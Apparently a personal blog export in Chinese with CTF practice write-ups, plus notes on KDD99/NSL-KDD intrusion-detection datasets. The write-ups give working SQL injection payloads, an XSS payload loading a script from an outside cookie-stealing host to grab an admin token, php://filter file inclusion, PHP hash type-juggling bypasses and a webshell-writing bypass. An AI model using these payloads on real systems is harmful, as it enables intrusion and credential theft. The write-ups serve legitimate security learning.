[{"title":"Stage1Day3 Web&Misc","date":"2020-03-10T11:07:53.000Z","path":"2020-03-10/Stage1Day3-Web-Misc/","text":"Blue-whale OJBasic SQL、Invisible flag、docx writeup. Basic SQL上来先确定是什么类型的注入，当输入&#39;时候出错，说明这是一个字符型的注入点。首先看当前数据表有几列，试到4时出错，说明有三列 1&apos; order by 4# 接下来看前三列中回显在哪几列 1&apos; union select 1,2,3# 可以看到最下面显示了2、3俩数字，表示可以利用这两个位置回显我们想要的结果，比如当前数据库数据库名、版本： 12&apos; union select 1,database(),version()#//回显为news，5.5.62 再看看所有的库名： 12&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata#回显为information_schema,news，information_schema库是MySQL自带的，它提供了访问数据库元数据（数据库名或表名、列的数据类型、访问权限等）的方式，优先看news库 接下来就是爆表、列、数据了：爆表： 12&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;news&apos;#//回显为f1agfl4gher3,news，进f1agfl4gher3看看 爆列： 12&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;f1agfl4gher3&apos;#//回显为id,h3r31sfl4g，flag快来了 爆数据： 12&apos; union select 1,group_concat(id),group_concat(h3r31sfl4g) from f1agfl4gher3#//回显就有flag 这比较基础，就是sqli-labs第二关吧，不过sql注入各种操作很多，还有sqlmap的使用，这都是以后要学习的东西 Invisible flag看到图片只有一半的BLUE-WHALE，再结合提示里的图片长度，就知道了应该使用010editor来修改图片的长度了：将修改后的结果导出为一个新的图片，即可在下方看到flag。 docx结合提示知道docx格式的文件本质上是一个zip文件，修改后缀名后就可以解压。一个docx文件可能会包含这些目录和组件： [Content_Types].xml这个文件描述的是整个文档内容的类型，把各个xml文件组合成一个整体。 docProps文件夹这个文件夹中的xml记录了docx文档的主要属性信息Core.xml：描述文件的创建时间，标题，主题和作者等给予open xml约定文档格式的通用文件属性App.xml：描述文档的其他属性，文档类型，版本，只读信息，共享，安全属性等特定的文件属性 rels 文件夹这个文件夹存放了所有指定的rels文件.res文件描述了文档结构中的起始关系，也可以叫做关系部件 item1.xml包含了一些文档中出现的数据。例如自定义XML数据部件。 打开修改后缀名后的文件，即可看到flag.xml，打开即可看到flag。 体会 比较熟悉的Web部分做完了，接下来就是Misc、逆向和pwn了，都没咋做过，希望一切顺利","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"}]},{"title":"Stage1Day2 Web","date":"2020-03-09T14:12:50.000Z","path":"2020-03-09/Stage1Day2-Web/","text":"Blue-whale OJBabyXSS、XSS1、BasicFileInclude writeup. BabyXSS 可以看到这个输入框应该就是注入点了。下面这个地方要求输入一个md5后前六位恰好为等号右边的字符串，一开始以为是找碰撞之类的吧，不过结合hint里推荐的proofofwork来看应该是要慢慢试出来。不过在安装cmake、MinGW，多次google设置cmakefile均无果后选择使用hashlib包。 123456import hashlibfor i in range(9999999999): s = hashlib.md5(str(i).encode(encoding='utf8')).hexdigest() if s.startswith(\"xxxxx\"): print(i) break 之后就很轻松了，得到对应的字符串后，在上方的留言框里放入获取cookie的脚本，即可将其提交到管理员的后台，（管理员在看到这条信息时）XSS平台便收到了管理员的token：使用Burp抓包，将自己的cookie替换为这个token再发包即可得到flag。 XSS1 这题与[BabyXSS](#BabyXSS)比较相似，也是获取管理员的cookie，不过这一次我们可以看到被注入xss的页面以及它过滤一些敏感符号的代码： 12345678910111213141516&lt;form action=\"\" method=\"GET\"&gt; &lt;input type=\"text\" name=\"name\" autofocus=\"autofocus\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt;&lt;?phpif(isset($_GET['name']))&#123; $text = $_GET['name']; $text = str_replace('\"','',$text); $text = str_replace('&gt;','',$text); $text = str_replace('&lt;','',$text); $text = str_replace(\"\\n\",'',$text); echo \"&lt;svg&gt;&lt;script&gt;var a=\\\"\". $text . \"\\\"&lt;/script&gt;&lt;/svg&gt;\";&#125;echo '&lt;hr /&gt;';show_source(__FILE__); 可以看到本题对” &lt; &gt; 以及回车进行了过滤，便考虑使用html编码来绕过。 hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);// 先将双引号闭合，再在html中写进去一个src属性为x（会出错）的img标签，然后onerror会在html中写进去一个src属性为cookie偷取链接的script，最后将后面的一个双引号注释掉。此处之注意将空格也进行编码处理（在提交的页面会进行检测）。输入文本框提交看看效果： 可以看到成功地写入了上面提到的img标签，并触发了chrome XSS Auditor的预警。 PS:不知道出了什么问题XSS平台一直收不到cookie，有待进一步观察 注意到hint里提示，发现输入框有autofocus属性，想到可以结合onfocus来触发XSS，但是这个输入框已经闭合了，注入点并不在其中，又想到自己搞一个文本框，设置一个autofocus，这样管理员进入评论管理版后不用任何操作就会发送flag，但实测这样貌似还是不行 BasicFileInclude 题目提示”flag就在这里，但是你看不到“。暗示要读取flag，鉴于不知道当前路径（无法使用file协议）,即考虑使用php伪协议php://filter php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 这是其参数： resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 123php://filter/read=convert.base64-encode/resource=upload.php这里读的过滤器为convert.base64-encode，即把输入流base64-encode。resource=upload.php，代表读取upload.php的内容 问题：一定要使用base64吗？还是说这是一种固定形式（网上几乎都是这种解答） 照葫芦画瓢地构造payload: http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag 网页上返回了一串base64编码，解码后发现这就是flag的代码。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"}]},{"title":"Stage1Day1 Web","date":"2020-03-08T11:46:09.000Z","path":"2020-03-08/Stage1Day1-Web/","text":"Blue-whale OJcalculator、RapidTyping、Basic PHP、Basic PHP 2 writeup. 今天是测试第一阶段的第一天。Keep posting! Calculator RapidTyping Basic PHP Basic PHP 2 总结Calculator 从题目要求可以看到，需要在1.5s内计算出一个比较大的四则运算。按计算器估计是来不及了，由hint我们知道用Python来实现。先贴代码： 12345678910111213import requestsfrom bs4 import BeautifulSoupurl = \"http://vps1.blue-whale.me:23331/calculator/\"cal_session = requests.session()cal_respond = cal_session.get(url)# print(cal_respond.text)soup = BeautifulSoup(cal_respond.text, 'lxml')span = soup.find(\"span\", id=\"exp\")num = eval(span.text.replace('=', ''))# print(num)ans = &#123;\"answer\": num&#125;r = cal_session.get(url, params=ans)print(r.text) 代码分为几个阶段：首先使用了requests，它是基于urllib3的一个用于发起http请求的包；之后引入了比较常见的BeautifulSoup。创建一个session对象后，发送请求并获得返回的response对象。 接下来将其转为BeautifulSoup对象，找到其中id为exp的span标签，将其内容去掉最后的等号后作为参数传入eval函数，将计算结果封装为get的参数，再次请求得到返回的带有flag的网页。 通过这个入门题目可以练习常用包requests和BeautifulSoup的使用。 RapidTyping 这个题目跟上个题目有点相似，也是要求在短时间内完成验证码输入。题目给出hint说不是用图像识别啥的，那就看看网页源代码吧。 做过的CTF题目不多，多是入门题，发现这种比较入门的题目通常要结合Base64之类的东西来考察，或者是在前端做一些限制。把后面这堆结尾是等号的代码拖到Base64解码里会发现是一大堆形似html的代码，其中text标签中包含的就是图片中的字母。下面贴上代码： 12345678910111213141516171819202122import requestsfrom bs4 import BeautifulSoupimport base64url = \"http://vps1.blue-whale.me:23331/captcha/\"session = requests.session()respond = session.get(url)soup = BeautifulSoup(respond.text, \"lxml\")# print(soup.img.attrs[\"src\"])encoded = soup.img.attrs[\"src\"].lstrip(\"data:image/svg+xml;base64,\")# print(encoded)encoded = base64.b64decode(encoded)soup = BeautifulSoup(encoded, \"lxml\")decoded = soup.find_all(name=\"text\")ans = \"\"for i in range(500): for s in decoded: if i == int(s[\"x\"]): ans += str(s.text)# print(ans)answ = &#123;\"code\":ans&#125;r = session.get(url,params=answ)print(r.text) 代码逻辑如下：依然是requests+BeautifulSoup获取页面内容，截取img标签src属性中的base64部分后解码，将text部分提取出来后带入二重循环，保证将每个字母按照x坐标的顺序加入到ans字符串中。最后将结果作为参数再次请求得到flag。 这里先按x坐标排序后再逐个提取字母速度更快，不过对python的数据结构不甚了解，未能实现。Python的学习有待加强。通过这个题目练习了requests、base64和BeautifulSoup的使用。 Basic PHP这题在bugku里见过，点开题目即可看到代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Exercise&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;PHP's basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt;&lt;?phprequire_once('flag.php');if (isset($_GET['name']) and isset($_GET['password']) &amp;&amp; isset($_GET['test']))&#123; // ========== Stage 1 ========== $test=$_GET['test']; $test=md5($test); if($test=='0') &#123; print 'You passed stage 1.&lt;br /&gt;'; &#125; else&#123; print \"Game over at stage 1.\"; exit(); &#125; // ========== Stage 2 ========== if ($_GET['name'] == $_GET['password'])&#123; print 'Your password can not be your name.'; exit(); &#125; else if (sha1($_GET['name']) === sha1($_GET['password']))&#123; print 'You passed stage 2.&lt;br /&gt;'; print 'Flag: '.$flag; &#125; else&#123; print 'Invalid password'; exit(); &#125;&#125;echo '&lt;hr /&gt;';show_source(__FILE__);?&gt;&lt;/body&gt;&lt;/html&gt; 输入name、password和test三个参数即可进入stage1，接下来是md5()漏洞的一个考察： PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，其中存在一个缺陷，就是它把每个以“0E”开头的哈希值都解析为0后再进行比较。所以，两个不同的密码经过md5()哈希以后，其哈希值都是以“0E”开头的话，那么PHP将会认为他们是相等的，都是0。 根据这个特性，找到一些md5后产生“0E”开头的字符串作为test的值： 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 随后进入stage2，我们发现题目要求name和password的值不同，而sha1的结果相同。想找到这种碰撞的概率太低了，此处考察了 sha1() 和 md5() 处理数组时会直接返回null，那么可以使 name 和 password为数组类型，sha1 对数组处理后返回 null 绕过 ===(===会判断左右两边的类型和值是否相同) 。 此时可以令name[]=0&amp;password[]=1，即可得到flag。 问题：令name[]=0&amp;password[]=0为什么不行？总之会返回null，值是0还是1会有影响吗 payload:http://vps1.blue-whale.me:23331/feature/?test=s878926199a&password[]=0&name[]=1 Basic PHP 2 题目给出要求getshell，联想到一句话木马，在这个框中随意输入内容，点击start进入新的页面： 在文本框输入一些内容后点击提交，回显success，此时再点击上面的./config.php会发现之前在文本框中的内容已被写入config.php。再结合下面的代码来看： 123456789101112&lt;?phpif(isset($_GET['content']))&#123; $filename = 'config.php'; $content = $_GET['content']; if(is_int(stripos($content, 'php')) || is_int(stripos($content, '&lt;'))) &#123; echo 'Invalid input'; &#125; else &#123; file_put_contents($filename, $content); echo 'Success'; &#125;&#125; stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。strpos() 函数查找字符串在另一字符串中第一次出现的位置（大小写敏感）。 意思已经比较明显了，我们可以通过content这个参数修改config.php中的内容，但是若想写入php一句话木马，就无法通过stripos()的检验(可以看到对php和&lt; 这两个字符串做了检测 )，此时可以利用strpos传入数组时会返回null，经is_int判断后返回false，即可绕过第一个条件判断（看起来stripos也存在这个问题）；这时候就可以通过file_put_content将一句话木马写入config.php了(其实只写一个&lt;即可得到flag)。 payload:http://vps1.blue-whale.me:23360/user/b4466a4c89f48932020df576d9a77e41902f5a0e/index.php?content[]=","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"}]},{"title":"毕业设计笔记","date":"2020-01-20T08:11:02.000Z","path":"2020-01-20/毕业设计笔记/","text":"随着近几年机器学习的迅速发展,许多研究人员使用机器学习算法来解决异常检测领域的难题,并且取得了许多实验成果。请利用该方法尝试实现小型网络的监控。可以利用KDD99数据库。 网络异常流量检测研究数据集选择 KDD99该数据集是从一个模拟的美国空军局域网上采集来的9个星期的网络连接数据,分成具有标识的训练数据和未加标识的测试数据。测试数据和训练数据有着不同的概率分布,测试数据包含了一些未出现在训练数据中的攻击类型,这使得入侵检测更具有现实性。 NSL-KDD该数据集解决了KDD99数据集中存在的固有问题。NSL-KDD数据集由于缺少基于入侵检测网络的公共数据集，所以NSL-KDD数据集仍然存在一些问题，同时也不是现有真实网络的完美代表。但它仍然可以用作有效的基准数据集，以帮助研究人员比较不同的入侵检测方法。NSL-KDD训练集和测试集的设置是合理的，不同研究工作的评估结果将是一致的和可比的。二者具体区别见下： It does not include redundant records in the train set, so the classifiers will not be biased towards more frequent records. NSL-KDD数据集的训练集中不包含冗余记录，所以分类器不会偏向更频繁的记录； There is no duplicate records in the proposed test sets; therefore, the performance of the learners are not biased by the methods which have better detection rates on the frequent records. NSL-KDD数据集的测试集中没有重复的记录，使得检测率更为准确。 The number of selected records from each difficultylevel group is inversely proportional to the percentage of records in the original KDD data set. As a result, the classification rates of distinct machine learning methods vary in a wider range, which makes it more efficient to have an accurate evaluation of different learning techniques. 来自每个难度级别组的所选记录的数量与原始KDD数据集中的记录的百分比成反比。结果，不同机器学习方法的分类率在更宽的范围内变化，这使得对不同学习技术的准确评估更有效。 The number of records in the train and test sets are reasonable, which makes it affordable to run the experiments on the complete set without the need to randomly select a small portion. Consequently, evaluation results of different research works will be consistent and comparable. 训练和测试中的记录数量设置是合理的，这使得在整套实验上运行实验成本低廉而无需随机选择一小部分。因此，不同研究工作的评估结果将是一致的和可比较的。 常用的深度学习算法","tags":[{"name":"IDS","slug":"IDS","permalink":"https://purewhitywhite.github.io/tags/IDS/"}]},{"title":"我的第一篇博客","date":"2019-06-01T13:39:12.000Z","path":"2019-06-01/我的第一篇博客/","text":"Better late than never,huh?","tags":[]}]